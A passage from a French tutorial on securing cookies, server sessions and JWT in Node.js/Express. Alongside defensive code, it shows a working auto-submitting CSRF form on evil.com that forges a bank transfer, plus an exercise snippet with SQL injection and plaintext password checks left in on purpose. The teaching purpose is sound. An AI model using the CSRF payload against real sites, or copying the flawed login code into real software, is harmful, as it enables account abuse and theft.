 * Route protégée — vérifie que la session est active.
 */
function requireSession(req, res, next) {
  if (!req.session.userId) {
    return res.status(401).json({ error: 'Non authentifié' });
  }
  next();
}

app.get('/profile', requireSession, (req, res) => {
  res.json({
    userId:  req.session.userId,
    email:   req.session.email,
    role:    req.session.role,
    loginAt: req.session.loginAt,
  });
});
```

---

## 10. Implémentation JWT Complète avec Node.js

### 10.1 Architecture access token + refresh token

```
┌──────────────────────────────────────────────────────────────────────┐
│              FLUX ACCESS TOKEN + REFRESH TOKEN                       │
│                                                                      │
│  1. Login ──────────────────────────────────────────────────────>    │
│     POST /auth/login { email, password }                             │
│     <────────────────────────────────────────────────────────────    │
│     { accessToken: "...", refreshToken: "..." }                      │
│     Set-Cookie: refreshToken=...; HttpOnly; Secure                   │
│                                                                      │
│  2. Requête API ────────────────────────────────────────────────>    │
│     GET /api/data                                                    │
│     Authorization: Bearer <accessToken>                              │
│     <────────────────────────────────────────────────────────────    │
│     200 OK { data: ... }                                             │
│                                                                      │
│  3. Access token expiré (après 15 min) ────────────────────────>    │
│     GET /api/data                                                    │
│     Authorization: Bearer <accessToken expiré>                       │
│     <────────────────────────────────────────────────────────────    │
│     401 { error: "TOKEN_EXPIRED" }                                   │
│                                                                      │
│  4. Rafraîchir le token ───────────────────────────────────────>    │
│     POST /auth/refresh                                               │
│     Cookie: refreshToken=...  (envoyé automatiquement)               │
│     <────────────────────────────────────────────────────────────    │
│     { accessToken: "nouveau_token" }                                 │
│                                                                      │
│  5. Logout ─────────────────────────────────────────────────────>   │
│     POST /auth/logout                                                │
│     Cookie: refreshToken=...                                         │
│     <────────────────────────────────────────────────────────────    │
│     200 OK                                                           │
│     Set-Cookie: refreshToken=; Max-Age=0  (suppression)              │
└──────────────────────────────────────────────────────────────────────┘
```

### 10.2 Implémentation complète

```js
const express = require('express');
const jwt     = require('jsonwebtoken');
const bcrypt  = require('bcrypt');
const crypto  = require('crypto');
const cookieParser = require('cookie-parser'); // npm install cookie-parser

const app = express();
app.use(express.json());
app.use(cookieParser());

const ACCESS_TOKEN_SECRET  = process.env.ACCESS_TOKEN_SECRET  || 'access_secret_CHANGE_ME';
const REFRESH_TOKEN_SECRET = process.env.REFRESH_TOKEN_SECRET || 'refresh_secret_CHANGE_ME';

// Stockage des refresh tokens valides (en prod : Redis ou DB)
const validRefreshTokens = new Set();

// Utilisateurs (en prod : base de données)
const users = [
  {
    id:       1,
    email:    'alice@example.com',
    password: '$2b$10$YoqpHoZwLJ5kG5bVrQe5meOSfRxCGYNqx2j1tP.kJ8mNUa9s0Ge7.',
    role:     'admin',
  },
];

// ─── Helpers ─────────────────────────────────────────────────────────────────

function createAccessToken(user) {
  return jwt.sign(
    { userId: user.id, email: user.email, role: user.role },
    ACCESS_TOKEN_SECRET,
    { algorithm: 'HS256', expiresIn: '15m', jwtid: crypto.randomUUID() }
  );
}

function createRefreshToken(userId) {
  const token = jwt.sign(
    { userId, jti: crypto.randomUUID() },
    REFRESH_TOKEN_SECRET,
    { algorithm: 'HS256', expiresIn: '30d' }
  );
  // Stocker le token comme valide
  validRefreshTokens.add(token);
  return token;
}

// ─── Middleware ───────────────────────────────────────────────────────────────

function authenticate(req, res, next) {
  const authHeader = req.headers['authorization'];
  if (!authHeader?.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'Token manquant' });
  }

  const token = authHeader.slice(7); // Retire "Bearer "

  try {
    req.user = jwt.verify(token, ACCESS_TOKEN_SECRET, { algorithms: ['HS256'] });
    next();
  } catch (error) {
    if (error.name === 'TokenExpiredError') {
      return res.status(401).json({ error: 'TOKEN_EXPIRED' });
    }
    return res.status(403).json({ error: 'TOKEN_INVALID' });
  }
}

// ─── Routes d'authentification ────────────────────────────────────────────────

app.post('/auth/login', async (req, res) => {
  const { email, password } = req.body;

  const user = users.find(u => u.email === email);
  if (!user || !(await bcrypt.compare(password, user.password))) {
    return res.status(401).json({ error: 'Identifiants invalides' });
  }

  const accessToken  = createAccessToken(user);
  const refreshToken = createRefreshToken(user.id);

  // Refresh token dans un cookie HttpOnly — jamais exposé au JS
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,
    secure:   process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    maxAge:   30 * 24 * 60 * 60 * 1000, // 30 jours en ms
    path:     '/auth/refresh',            // Limiter le cookie au seul endpoint de refresh
  });

  res.json({
    accessToken,
    expiresIn: 900, // 15 minutes en secondes
    user: { id: user.id, email: user.email, role: user.role },
  });
});

app.post('/auth/refresh', (req, res) => {
  const refreshToken = req.cookies.refreshToken;

  if (!refreshToken) {
    return res.status(401).json({ error: 'Refresh token manquant' });
  }

  // Vérifier que le token est dans notre liste de tokens valides
  if (!validRefreshTokens.has(refreshToken)) {
    return res.status(403).json({ error: 'Refresh token révoqué ou invalide' });
  }

  try {
    const payload = jwt.verify(refreshToken, REFRESH_TOKEN_SECRET, {
      algorithms: ['HS256'],
    });

    // Trouver l'utilisateur
    const user = users.find(u => u.id === payload.userId);
    if (!user) {
      return res.status(403).json({ error: 'Utilisateur introuvable' });
    }

    // Rotation du refresh token — invalider l'ancien, créer un nouveau
    validRefreshTokens.delete(refreshToken);
    const newRefreshToken = createRefreshToken(user.id);
    const newAccessToken  = createAccessToken(user);

    res.cookie('refreshToken', newRefreshToken, {
      httpOnly: true,
      secure:   process.env.NODE_ENV === 'production',
      sameSite: 'strict',
      maxAge:   30 * 24 * 60 * 60 * 1000,
      path:     '/auth/refresh',
    });

    res.json({
      accessToken: newAccessToken,
      expiresIn:   900,
    });
  } catch (error) {
    // Token expiré ou invalide → forcer re-login
    validRefreshTokens.delete(refreshToken);
    return res.status(403).json({ error: 'Refresh token invalide' });
  }
});

app.post('/auth/logout', (req, res) => {
  const refreshToken = req.cookies.refreshToken;

  if (refreshToken) {
    // Révoquer le refresh token
    validRefreshTokens.delete(refreshToken);
  }

  // Supprimer le cookie
  res.clearCookie('refreshToken', { path: '/auth/refresh' });
  res.json({ message: 'Déconnexion réussie' });
});

// ─── Routes protégées ─────────────────────────────────────────────────────────

app.get('/api/me', authenticate, (req, res) => {
  res.json({ user: req.user });
});

app.listen(3000, () => console.log('Serveur JWT démarré sur http://localhost:3000'));
```

### 10.3 Exemple de requêtes HTTP

```bash
# 1. Login
curl -X POST http://localhost:3000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"alice@example.com","password":"password123"}' \
  -c cookies.txt

# Réponse :
# {
#   "accessToken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
#   "expiresIn": 900,
#   "user": { "id": 1, "email": "alice@example.com", "role": "admin" }
# }

# 2. Appel protégé avec le token
ACCESS_TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

curl http://localhost:3000/api/me \
  -H "Authorization: Bearer $ACCESS_TOKEN"

# 3. Rafraîchir le token (le refresh token est dans cookies.txt)
curl -X POST http://localhost:3000/auth/refresh \
  -b cookies.txt \
  -c cookies.txt

# 4. Déconnexion
curl -X POST http://localhost:3000/auth/logout \
  -b cookies.txt
```

---

## 11. Session Fixation — Attaque et Protection

### 11.1 Mécanisme de l'attaque

La **session fixation** exploite le fait que certains serveurs conservent le même session ID avant et après le login.

```
┌──────────────────────────────────────────────────────────────────┐
│              ATTAQUE SESSION FIXATION                            │
│                                                                  │
│  Attaquant                 Serveur                  Victime      │
│     │                         │                        │         │
│     │ GET /login              │                        │         │
│     │ ──────────────────────> │                        │         │
│     │                         │                        │         │
│     │ Set-Cookie: sid=FIXED   │                        │         │
│     │ <────────────────────── │                        │         │
│     │                         │                        │         │
│     │   Partage le lien :                              │         │
│     │   https://example.com/login?sid=FIXED            │         │
│     │ ─────────────────────────────────────────────>  │         │
│     │                         │                        │         │
│     │                         │ Victime se connecte   │         │
│     │                         │ <──────────────────── │         │
│     │                         │                        │         │
│     │                         │ Session FIXED          │         │
│     │                         │ appartient maintenant │         │
│     │                         │ à Alice !              │         │
│     │                         │ ──────────────────── > │         │
│     │                         │                        │         │
│     │ Attaquant utilise sid=FIXED → accès au compte d'Alice !    │
└──────────────────────────────────────────────────────────────────┘
```

### 11.2 Protection — Régénérer l'ID après login

La parade est simple et obligatoire : **régénérer le session ID lors de toute élévation de privilèges** (login, changement de rôle, validation d'email).

```js
// ❌ DANGEREUX : garder le même session ID
app.post('/auth/login', async (req, res) => {
  // ... vérification des credentials ...
  req.session.userId = user.id; // Le session ID reste identique !!
  res.json({ success: true });
});

// ✅ CORRECT : régénérer le session ID
app.post('/auth/login', async (req, res) => {
  // ... vérification des credentials ...

  req.session.regenerate((err) => {
    if (err) return res.status(500).json({ error: 'Erreur serveur' });

    // Nouveau session ID généré → l'ancien (éventuellement fixé) est invalide
    req.session.userId = user.id;
    req.session.role   = user.role;

    req.session.save((err) => {
      if (err) return res.status(500).json({ error: 'Erreur serveur' });
      res.json({ success: true });
    });
  });
});
```

---

## 12. Session Hijacking — Vol de Cookie et Protections

### 12.1 Vecteurs d'attaque

| Vecteur | Description |
|---|---|
| **XSS** | Script malveillant lit `document.cookie` et exfiltre le token |
| **Man-in-the-Middle** | Trafic HTTP non chiffré → cookie intercepté |
| **Vol physique** | Accès à la machine ou au profil navigateur |
| **Sniffing réseau** | Sur réseau non sécurisé (WiFi public) sans HTTPS |
| **Subdomain takeover** | Sous-domaine compromis pose des cookies sur le domaine parent |

### 12.2 Protections multicouches

```js
// Protection 1 : HttpOnly (vol via XSS impossible)
// Protection 2 : Secure (interception réseau impossible)
// Protection 3 : SameSite (CSRF atténué)
cookie: {
  httpOnly: true,
  secure: true,
  sameSite: 'lax',
}

// Protection 4 : Fingerprinting de session (bind à l'IP/User-Agent)
app.post('/auth/login', async (req, res) => {
  req.session.regenerate((err) => {
    req.session.userId    = user.id;
    req.session.ipAddress = req.ip;
    req.session.userAgent = req.headers['user-agent'];
    req.session.save(() => res.json({ success: true }));
  });
});

// Middleware de vérification du fingerprint
function verifyFingerprint(req, res, next) {
  if (!req.session.userId) return next();

  const ipMismatch        = req.ip !== req.session.ipAddress;
  const userAgentMismatch = req.headers['user-agent'] !== req.session.userAgent;

  if (ipMismatch || userAgentMismatch) {
    // Log de sécurité
    console.warn('Session hijacking détecté', {
      sessionId:        req.sessionID,
      storedIp:         req.session.ipAddress,
      currentIp:        req.ip,
      storedUserAgent:  req.session.userAgent,
      currentUserAgent: req.headers['user-agent'],
    });

    // Invalider la session
    return req.session.destroy(() => {
      res.status(401).json({ error: 'Session invalide — reconnexion requise' });
    });
  }

  next();
}

app.use(verifyFingerprint);
```

> [!warning] Limites du fingerprinting IP
> Vérifier l'IP est efficace mais peut faussement invalider des sessions légitimes (utilisateurs qui changent de réseau, proxies, NAT). En pratique, alerter et logger plutôt que bloquer directement. La vérification du User-Agent seul est insuffisante (trivial à usurper).

### 12.3 Rotation du session ID

Régénérer périodiquement le session ID réduit la fenêtre d'exploitation en cas de vol :

```js
function rotateSessionIfNeeded(req, res, next) {
  if (!req.session.userId) return next();

  const now      = Date.now();
  const lastRotation = req.session.lastRotation || 0;
  const rotationInterval = 15 * 60 * 1000; // 15 minutes

  if (now - lastRotation > rotationInterval) {
    const sessionData = { ...req.session };

    req.session.regenerate((err) => {
      if (err) return next(err);

      // Restaurer les données de session
      Object.assign(req.session, sessionData);
      req.session.lastRotation = now;

      req.session.save(() => next());
    });
  } else {
    next();
  }
}

app.use(rotateSessionIfNeeded);
```

---

## 13. CSRF — Cross-Site Request Forgery

### 13.1 Mécanisme de l'attaque

Le **CSRF** exploite le fait que le navigateur envoie automatiquement les cookies lors de requêtes cross-site. Un site malveillant peut forcer le navigateur authentifié d'une victime à effectuer des actions à son insu.

```html
<!-- Page sur evil.com — la victime la visite pendant sa session sur bank.com -->
<!DOCTYPE html>
<html>
<body>
  <!-- Formulaire auto-soumis dès le chargement de la page -->
  <form id="csrf-form" 
        action="https://bank.com/transfer" 
        method="POST" 
        style="display:none">
    <input type="hidden" name="to_account" value="attacker_account">
    <input type="hidden" name="amount"     value="5000">
  </form>
  <script>
    // Soumettre automatiquement à l'ouverture de la page
    document.getElementById('csrf-form').submit();
  </script>
</body>
</html>
```

```
Victime connectée à bank.com (cookie de session valide)
  → Visite evil.com
  → Formulaire soumis vers bank.com
  → Navigateur joint automatiquement le cookie de session
  → bank.com reçoit une requête authentifiée valide
  → Virement effectué sans le consentement de la victime
```

### 13.2 Protection par token CSRF synchronisé (Double Submit)

```js
const csrf   = require('csurf');  // npm install csurf
const cookieParser = require('cookie-parser');

app.use(cookieParser());
app.use(express.json());

// Middleware CSRF — génère et valide un token anti-CSRF
const csrfProtection = csrf({
  cookie: true, // Token stocké dans un cookie (non-HttpOnly, lisible par JS)
});

// Inclure le token CSRF dans toutes les réponses HTML
app.get('/form', csrfProtection, (req, res) => {
  // req.csrfToken() génère un token unique pour cette session
  res.json({ csrfToken: req.csrfToken() });
});

// Valider le token sur les mutations
app.post('/transfer', csrfProtection, (req, res) => {
  // Si le token est absent ou incorrect, csurf renvoie une 403 automatiquement
  res.json({ success: true, message: 'Virement effectué' });
});

// Gestionnaire d'erreur CSRF
app.use((err, req, res, next) => {
  if (err.code === 'EBADCSRFTOKEN') {
    return res.status(403).json({ error: 'Token CSRF invalide — requête refusée' });
  }
  next(err);
});
```

**Côté client — inclure le token dans chaque requête :**

```js
// Récupérer le token CSRF
async function fetchCSRFToken() {
  const response = await fetch('/form');
  const data = await response.json();
  return data.csrfToken;
}

// L'inclure dans les requêtes POST
async function makeTransfer(amount, toAccount) {
  const csrfToken = await fetchCSRFToken();

  const response = await fetch('/transfer', {
    method:  'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken, // Le token dans un header custom
    },
    credentials: 'include', // Envoyer les cookies
    body: JSON.stringify({ amount, toAccount }),
  });

  return response.json();
}
```

### 13.3 Pourquoi ça fonctionne

```
Requête légitime (depuis example.com) :
  - Cookie de session envoyé automatiquement ✅
  - CSRF token lu depuis la page (possible car same-origin) ✅
  - X-CSRF-Token dans le header ✅
  - Serveur valide token → requête acceptée ✅

Requête CSRF (depuis evil.com) :
  - Cookie de session envoyé automatiquement ✅ (problème initial)
  - CSRF token illisible (evil.com ne peut pas lire les cookies de bank.com) ❌
  - X-CSRF-Token absent ❌
  - Serveur invalide → requête refusée ✅
```

> [!tip] SameSite=Lax comme première ligne de défense
> Si `SameSite=Lax` est défini sur le cookie de session, les formulaires POST cross-site n'envoient pas le cookie du tout — l'attaque CSRF échoue sans même avoir besoin d'un token CSRF. Les deux protections sont complémentaires : SameSite côté cookie, CSRF token pour les cas restants.

---

## 14. Local Storage vs Session Storage vs Cookies

### 14.1 Tableau comparatif

| Critère | localStorage | sessionStorage | Cookies |
|---|---|---|---|
| **Capacité** | 5-10 Mo | 5 Mo | 4 Ko |
| **Durée de vie** | Indéfinie | Onglet ouvert | Max-Age / Expires |
| **Portée** | Origine (même domaine) | Onglet courant | Domaine + Path |
| **Envoi automatique** | Jamais | Jamais | À chaque requête HTTP |
| **Accès JS** | Toujours | Toujours | Sauf HttpOnly |
| **Accès serveur** | Non (via JS fetch) | Non | Oui (header Cookie) |
| **Protection XSS** | Aucune | Aucune | HttpOnly neutralise |
| **Protection CSRF** | N/A | N/A | SameSite / Token CSRF |
| **Compatible SSR** | Non | Non | Oui |
| **Support HTTPS only** | Non | Non | Attribut Secure |

### 14.2 Quoi stocker où

```
localStorage :
  ✅ Préférences UI non sensibles (thème, langue)
  ✅ Cache local de données publiques
  ✅ État de l'UI (sidebar ouverte/fermée)
  ❌ Tokens d'authentification
  ❌ Données personnelles
  ❌ Informations sensibles

sessionStorage :
  ✅ Données temporaires d'un workflow multi-étapes (formulaire, wizard)
  ✅ État temporaire de session de navigation
  ❌ Tokens d'authentification (perdus à la fermeture de l'onglet)

Cookies HttpOnly + Secure :
  ✅ Session ID (sessions serveur)
  ✅ Refresh tokens (JWT)
  ✅ Tokens de mémorisation longue durée
  ❌ Données volumineuses (limite 4 Ko)
  ❌ Données fréquemment modifiées (overhead réseau)
```

> [!warning] Ne jamais stocker un JWT dans localStorage
> C'est une pratique courante mais dangereuse. Un XSS sur n'importe quelle librairie de ta page peut exfiltrer le token. Utilise un cookie HttpOnly pour le refresh token, et garde l'access token uniquement en mémoire JavaScript (variable de module) — il disparaît à la fermeture de l'onglet, ce qui est acceptable pour un token de 15 min.

```js
// ❌ DANGEREUX
localStorage.setItem('accessToken', token);

// ❌ AUSSI DANGEREUX
sessionStorage.setItem('accessToken', token);

// ✅ CORRECT : en mémoire, durée de vie = durée de l'onglet
let accessToken = null; // Variable de module, pas de stockage persistant

function setAccessToken(token) {
  accessToken = token;
}

function getAccessToken() {
  return accessToken;
}

// Le refresh token, lui, va dans un cookie HttpOnly posé par le serveur
// → inaccessible au JS, envoyé automatiquement au bon endpoint
```

---

## 15. Cas Pratique — Implémentation Complète Auth Session Sécurisée

### 15.1 Architecture du projet

```
auth-demo/
├── package.json
├── .env
├── server.js         ← Point d'entrée
├── middleware/
│   ├── auth.js       ← Vérification de session
│   └── csrf.js       ← Protection CSRF
├── routes/
│   ├── auth.js       ← Login, logout, refresh
│   └── api.js        ← Routes protégées
└── utils/
    └── session.js    ← Helpers session
```

### 15.2 Fichier .env

```bash
# .env — NE JAMAIS COMMITTER CE FICHIER
NODE_ENV=development
PORT=3000
SESSION_SECRET=votre_cle_secrete_tres_longue_et_aleatoire_min_32_chars
REDIS_URL=redis://localhost:6379
BCRYPT_ROUNDS=12
```

### 15.3 server.js

```js
require('dotenv').config(); // npm install dotenv

const express      = require('express');
const session      = require('express-session');
const { createClient } = require('redis');
const { RedisStore }   = require('connect-redis');
const helmet           = require('helmet');         // npm install helmet
const rateLimit        = require('express-rate-limit'); // npm install express-rate-limit
const cookieParser     = require('cookie-parser');

const authRoutes = require('./routes/auth');
const apiRoutes  = require('./routes/api');

const app = express();

// ─── Sécurité de base ─────────────────────────────────────────────────────────

// Helmet : configures des headers de sécurité HTTP (Content-Security-Policy, etc.)
app.use(helmet());

// Rate limiting sur les routes d'auth (protection brute force)
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // Fenêtre de 15 minutes
  max:      10,               // Max 10 tentatives par IP par fenêtre
  message:  { error: 'Trop de tentatives. Réessaie dans 15 minutes.' },
  standardHeaders: true,
  legacyHeaders:   false,
});

// ─── Middlewares ──────────────────────────────────────────────────────────────

app.use(express.json({ limit: '10kb' })); // Limite la taille du body
app.use(cookieParser(process.env.SESSION_SECRET));

// ─── Configuration Session avec Redis ────────────────────────────────────────

async function configureSession() {
  const redisClient = createClient({ url: process.env.REDIS_URL });
  redisClient.on('error', err => console.error('Redis Error:', err));
  await redisClient.connect();

  app.use(session({
    secret:            process.env.SESSION_SECRET,
    resave:            false,
    saveUninitialized: false,
    store:             new RedisStore({ client: redisClient, ttl: 86400 }),
    name:              'sid',
    cookie: {
      secure:   process.env.NODE_ENV === 'production',
      httpOnly: true,
      sameSite: 'lax',
      maxAge:   24 * 60 * 60 * 1000,
    },
  }));

  // ─── Routes ──────────────────────────────────────────────────────────────────

  app.use('/auth', authLimiter, authRoutes);
  app.use('/api', apiRoutes);

  // Gestionnaire d'erreurs global
  app.use((err, req, res, next) => {
    console.error('Erreur non gérée:', err.message);
    res.status(500).json({ error: 'Erreur serveur interne' });
  });

  const PORT = process.env.PORT || 3000;
  app.listen(PORT, () => {
    console.log(`Serveur démarré sur http://localhost:${PORT}`);
  });
}

configureSession().catch(console.error);
```

### 15.4 routes/auth.js

```js
const express = require('express');
const bcrypt  = require('bcrypt');
const router  = express.Router();

// Utilisateurs en base (simulé — en prod : ORM/DB)
const users = [
  {
    id:           1,
    email:        'alice@example.com',
    passwordHash: '$2b$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8/LewdBPj4J/HS2hO9y',
    role:         'admin',
    active:       true,
  },
];

// ─── Helpers ──────────────────────────────────────────────────────────────────

/**
 * Met à jour les données de session après login réussi.
 * Appelé après req.session.regenerate() pour éviter la session fixation.
 */
function populateSession(session, user, req) {
  session.userId    = user.id;
  session.email     = user.email;
  session.role      = user.role;
  session.loginAt   = new Date().toISOString();
  session.ipAddress = req.ip;
  session.userAgent = req.headers['user-agent'];
}

// ─── Routes ───────────────────────────────────────────────────────────────────

/**
 * POST /auth/login
 */
router.post('/login', async (req, res) => {
  const { email, password } = req.body;

  // Validation des inputs
  if (!email || typeof email !== 'string') {
    return res.status(400).json({ error: 'Email requis' });
  }
  if (!password || typeof password !== 'string') {
    return res.status(400).json({ error: 'Mot de passe requis' });
  }

  // Recherche utilisateur (timing constant pour éviter l'énumération)
  const user = users.find(u => u.email === email.toLowerCase().trim());

  // Toujours effectuer la comparaison bcrypt même si l'utilisateur n'existe pas
  // → Évite l'attaque de timing (mesurer la durée = savoir si l'email existe)
  const dummyHash = '$2b$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8/LewdBPj4J/HS2hO9y';
  const hashToCompare = user ? user.passwordHash : dummyHash;
  const isPasswordValid = await bcrypt.compare(password, hashToCompare);

  if (!user || !isPasswordValid || !user.active) {
    return res.status(401).json({ error: 'Identifiants invalides' });
  }

  // Régénérer le session ID — protection session fixation
  req.session.regenerate((err) => {
    if (err) {
      console.error('Session regenerate error:', err);
      return res.status(500).json({ error: 'Erreur serveur' });
    }

    populateSession(req.session, user, req);

    req.session.save((err) => {
      if (err) {
        console.error('Session save error:', err);
        return res.status(500).json({ error: 'Erreur serveur' });
      }

      console.info(`Login réussi : userId=${user.id} ip=${req.ip}`);

      res.json({
        message: 'Connexion réussie',
        user: {
          id:    user.id,
          email: user.email,
          role:  user.role,
        },
      });
    });
  });
});

/**
 * POST /auth/logout
 */
router.post('/logout', (req, res) => {
  const userId = req.session.userId;

  req.session.destroy((err) => {
    if (err) {
      console.error('Session destroy error:', err);
      return res.status(500).json({ error: 'Erreur lors de la déconnexion' });
    }

    // Supprimer le cookie
    res.clearCookie('sid', { path: '/' });

    if (userId) {
      console.info(`Logout : userId=${userId} ip=${req.ip}`);
    }

    res.json({ message: 'Déconnexion réussie' });
  });
});

/**
 * GET /auth/me — Vérifier la session courante
 */
router.get('/me', (req, res) => {
  if (!req.session.userId) {
    return res.status(401).json({ authenticated: false });
  }

  res.json({
    authenticated: true,
    user: {
      id:      req.session.userId,
      email:   req.session.email,
      role:    req.session.role,
      loginAt: req.session.loginAt,
    },
  });
});

module.exports = router;
```

### 15.5 middleware/auth.js

```js
/**
 * Middleware d'authentification via session.
 * Vérifie la présence et l'intégrité de la session.
 */
function requireAuth(req, res, next) {
  if (!req.session.userId) {
    return res.status(401).json({
      error:    'Non authentifié',
      redirect: '/login',
    });
  }

  // Vérification basique d'intégrité (détection session hijacking)
  const ipMismatch = req.ip !== req.session.ipAddress;
  if (ipMismatch && process.env.NODE_ENV === 'production') {
    console.warn('Possible session hijacking', {
      sessionId: req.sessionID,
      storedIp:  req.session.ipAddress,
      currentIp: req.ip,
    });
    // En prod strict : invalider. En dev : juste logguer.
    // req.session.destroy(() => res.status(401).json({ error: 'Session invalide' }));
    // return;
  }

  next();
}

/**
 * Middleware de vérification de rôle.
 * @param {...string} roles - Rôles autorisés
 */
function requireRole(...roles) {
  return (req, res, next) => {
    if (!req.session.userId) {
      return res.status(401).json({ error: 'Non authentifié' });
    }

    if (!roles.includes(req.session.role)) {
      return res.status(403).json({
        error:    'Permissions insuffisantes',
        required: roles,
        current:  req.session.role,
      });
    }

    next();
  };
}

module.exports = { requireAuth, requireRole };
```

### 15.6 routes/api.js

```js
const express = require('express');
const { requireAuth, requireRole } = require('../middleware/auth');
const router = express.Router();

// Toutes les routes /api nécessitent une session valide
router.use(requireAuth);

router.get('/profile', (req, res) => {
  res.json({
    id:      req.session.userId,
    email:   req.session.email,
    role:    req.session.role,
    loginAt: req.session.loginAt,
  });
});

router.get('/admin/users', requireRole('admin'), (req, res) => {
  res.json({
    message: 'Liste des utilisateurs (admin uniquement)',
    users: [/* ... */],
  });
});

module.exports = router;
```

### 15.7 Test des endpoints avec curl

```bash
# ─── Login ────────────────────────────────────────────────────────
curl -X POST http://localhost:3000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"alice@example.com","password":"password123"}' \
  -c session_cookies.txt \
  -v

# La réponse inclut :
# Set-Cookie: sid=s%3AaBcDeF...; Path=/; HttpOnly; SameSite=Lax

# ─── Accès à une route protégée ───────────────────────────────────
curl http://localhost:3000/api/profile \
  -b session_cookies.txt

# ─── Vérifier la session ──────────────────────────────────────────
curl http://localhost:3000/auth/me \
  -b session_cookies.txt

# ─── Tenter une route admin avec un rôle insuffisant ──────────────
# (Si l'utilisateur a role=user et non admin)
curl http://localhost:3000/api/admin/users \
  -b session_cookies.txt
# → 403 { error: "Permissions insuffisantes" }

# ─── Logout ───────────────────────────────────────────────────────
curl -X POST http://localhost:3000/auth/logout \
  -b session_cookies.txt \
  -c session_cookies.txt

# ─── Vérifier que la session est invalidée ────────────────────────
curl http://localhost:3000/api/profile \
  -b session_cookies.txt
# → 401 { error: "Non authentifié" }
```

---

## Exercices Pratiques

### Exercice 1 — Cookie Consent Banner

Implémente une bannière de consentement RGPD :
- Affiche la bannière si `document.cookie` ne contient pas `consent_given=true`
- Le bouton "Accepter" pose `consent_given=true; Max-Age=31536000; SameSite=Lax` et masque la bannière
- Le bouton "Refuser" pose `consent_given=false; Max-Age=31536000` sans charger les scripts analytics
- Si `consent_given=true`, charger dynamiquement un script analytics simulé

### Exercice 2 — Analyser un JWT

Prends ce JWT (ne contient pas de données sensibles — c'est un exemple pédagogique) :
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsImVtYWlsIjoiYWxpY2VAZXhhbXBsZS5jb20iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MDAwMDAwMDAsImV4cCI6MTcwMDA5MDAwMH0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```
1. Décode manuellement le header et le payload avec `atob()` ou un outil en ligne
2. Identifie tous les claims et leur signification
3. Le token est-il expiré ? (Indice : regarde le claim `exp`)

### Exercice 3 — Implémenter le Rate Limiting

Sur le projet de la section 15, ajoute :
1. Un rate limiter global sur `/auth/login` : 5 tentatives par IP sur 15 minutes
2. Un rate limiter plus strict par email : 3 tentatives par email sur 1 heure (Indice : utilise un compteur Redis)
3. Un délai exponentiel entre les tentatives (100ms, 200ms, 400ms...)

### Exercice 4 — Identifier les failles

Le code suivant contient plusieurs failles de sécurité. Identifie-les toutes et propose les corrections :

```js
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  const user = await db.query(`SELECT * FROM users WHERE username = '${username}'`);
  
  if (user && user.password === password) {
    req.session.user = user;
    res.json({ token: jwt.sign({ id: user.id }, 'secret') });
  } else {
    res.json({ error: 'Wrong credentials' });
  }
});

app.get('/admin', (req, res) => {
  if (req.session.user) {
    res.json({ data: adminData });
  }
});
```

> [!tip] Réponse Exercice 4
> Failles à trouver :
> 1. Injection SQL dans la requête (concaténation directe de `username`)
> 2. Mot de passe comparé en clair (pas de bcrypt)
> 3. Secret JWT hardcodé (`'secret'`)
> 4. Session non régénérée après login (session fixation)
> 5. La réponse d'erreur envoie un code 200 au lieu de 401
> 6. Pas de vérification de rôle sur `/admin` — toute session suffit
> 7. Le JWT est émis mais la session aussi — incohérence architecturale

---

## Récapitulatif — Checklist de Sécurité

```
COOKIES
  ✅ HttpOnly sur tous les cookies d'authentification
  ✅ Secure en production (HTTPS uniquement)
  ✅ SameSite=Lax minimum, Strict pour les zones sensibles
  ✅ Max-Age adapté au contexte (session courte pour les actions sensibles)
  ✅ Noms de cookies non révélateurs (pas "session_id" → "sid")
  ✅ Path=/auth/refresh pour le refresh token

SESSIONS SERVEUR
  ✅ Session ID généré avec crypto.randomBytes(32)
  ✅ req.session.regenerate() après chaque login
  ✅ req.session.destroy() au logout
  ✅ Stockage Redis (pas MemoryStore) en production
  ✅ TTL cohérent avec maxAge du cookie
  ✅ Fingerprinting IP/User-Agent (optionnel, loggué)

JWT
  ✅ Access token courte durée (15 min)
  ✅ Refresh token longue durée, stocké en cookie HttpOnly
  ✅ Rotation du refresh token à chaque utilisation
  ✅ Blacklist ou révocation des tokens compromis
  ✅ Algorithme HS256 minimum, RS256 pour multi-services
  ✅ Claims iss, aud, exp, jti renseignés
  ✅ Secret JWT en variable d'environnement, min 32 chars aléatoires

PROTECTION CSRF
  ✅ SameSite=Lax ou Strict sur le cookie de session
  ✅ CSRF token sur toutes les mutations (POST, PUT, DELETE, PATCH)
  ✅ Valider l'en-tête Origin/Referer en complément

GÉNÉRAL
  ✅ Rate limiting sur les endpoints d'authentification
  ✅ Helmet.js pour les headers de sécurité HTTP
  ✅ Messages d'erreur génériques (pas d'information sur l'existence d'un compte)
  ✅ Logs de sécurité (login, logout, erreurs d'auth, anomalies)
  ✅ HTTPS partout en production (redirection HTTP → HTTPS)
  ✅ bcrypt avec rounds ≥ 12 pour les mots de passe
```
